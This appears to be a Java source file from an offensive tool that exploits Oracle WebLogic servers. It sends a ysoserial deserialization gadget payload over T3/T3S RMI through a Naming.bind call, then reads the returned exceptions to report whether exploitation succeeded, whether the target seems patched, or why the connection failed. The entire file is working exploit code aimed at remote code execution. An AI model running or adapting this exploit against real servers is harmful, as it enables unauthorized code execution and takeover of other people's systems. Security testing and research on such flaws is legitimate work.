package bort.millipede.wlt3;

import java.rmi.Remote;
import java.rmi.MarshalException;
import java.rmi.UnknownHostException;

//third-party includes
import weblogic.rmi.Naming;
import weblogic.rjvm.PeerGoneException;
import ysoserial.payloads.util.Gadgets;

public class WLNamingExploit {
	public static void runWLBindExploit(Object payload,String host,int port,boolean t3s,boolean verbose) {
		String protocol = "t3";
		if(t3s) protocol = "t3s";
		
		try {
			Naming.bind(protocol+"://"+host+":"+Integer.toString(port)+"/Mcgarnigal"+System.nanoTime(),Gadgets.createMemoitizedProxy(Gadgets.createMap("pwned"+System.nanoTime(),payload),Remote.class)); //weblogic T3 RMI bind-based exploitation
		} catch(MarshalException me) {
			System.out.print("\b\b\b\bsucceeded!\n");
			
			Throwable cause = me.getCause();
			if(cause!=null) {
				String eType = cause.getClass().getName();
				switch(eType) {
					case "javax.naming.NoPermissionException":
						System.out.println("javax.naming.NoPermissionException thrown, but this is normal for \"WLBind\" method. Exploitation appears successful!"+(verbose ? "" : "\nRe-run with --verbose option to see full Exception output!"));
						break;
					default:
						System.err.println("Unknown Marshal Error occurred ("+eType+")!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
				}
			} else {
				System.err.println("Unknown Marshal Error occurred!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
			}
			
			if(verbose) {
				System.err.print("\n");
				me.printStackTrace();
			}
		} catch(PeerGoneException pge) {
			System.out.print("\b\b\b\bsucceeded!\n");
			System.err.println("Target WebLogic Server at "+protocol+"://"+host+":"+port+" forcefully closed "+protocol.toUpperCase()+" connection! Server seems to be patched!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
			if(verbose) {
				System.err.print("\n");
				pge.printStackTrace();
			}
		} catch(UnknownHostException uhe) {
			System.out.print("\b\b\b\bfailed!\n");
			
			Throwable cause = uhe.getCause();
			if(cause!=null) {
				String eType = cause.getClass().getName();
				switch(eType) {
					case "javax.naming.CommunicationException":
						String message = uhe.getMessage();
						if(message.contains("java.io.IOException: Empty server reply")) {
							System.err.println("Target Server/Port at "+host+":"+port+" does not appear to be running "+protocol.toUpperCase()+"! Target may not be a WebLogic Server!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
						} else if(message.contains("java.net.ConnectException: Connection refused")) {
							System.err.println(protocol.toUpperCase()+" Connection to "+host+":"+Integer.toString(port)+" refused! Target host appears to be down or port is closed!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
						} else if(message.contains("javax.net.ssl.SSLHandshakeException")) {
							if(message.contains("handshake_failure")) {
								System.err.println(protocol.toUpperCase()+" Connection to "+host+":"+Integer.toString(port)+" failed (Handshake Error)! Try a different TLS connection protocol!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
							} else if(message.contains("PKIX") && message.contains("unable to find valid certification path")) {
								System.err.println(protocol.toUpperCase()+" Connection to "+host+":"+Integer.toString(port)+" failed! "+(verbose ? "" : "\nRe-run with --verbose option to see full error output!")); //TODO add messaging about InstallCert
							} else if(message.contains("Remote host closed connection during handshake")) {
								System.err.println(protocol.toUpperCase()+" Connection to "+host+":"+Integer.toString(port)+" failed, Remote host closed connection during handshake! Target host/port may not be running an SSL/TLS service!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
							} else {
								System.err.println(protocol.toUpperCase()+" Connection to "+host+":"+Integer.toString(port)+" failed! Target host/port may not be running an SSL/TLS service!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
							}
						} else if(message.contains("weblogic.socket.UnrecoverableConnectException") && message.contains("Login failed for an unknown reason")) {
							if(protocol.toUpperCase().equals("T3")) {
								System.err.println("Target Server/Port at "+host+":"+port+" forcefully reset "+protocol.toUpperCase()+" connection! Service may be running with SSL/TLS (use --t3s option)!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
							} else {
								System.err.println("Target Server/Port at "+host+":"+port+" forcefully reset "+protocol.toUpperCase()+" connection! Target may not be a WebLogic Server!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
							}
						} else {
							System.err.println("Unknown Host Communication Error occurred ("+eType+")!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
						}
						break;
					default:
						System.err.println("Unknown Host Error occurred ("+eType+")!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
						break;
				}
			} else {
				System.err.println("Unknown Host Error occurred"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
			}
			if(verbose) {
				System.err.print("\n");
				uhe.printStackTrace();
			}
		} catch(Exception e) {
			System.err.println("Unknown Error occurred ("+e.getClass().getName()+")!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
			if(verbose) {
				System.err.print("\n");
				e.printStackTrace();
			}
		}
	}
}
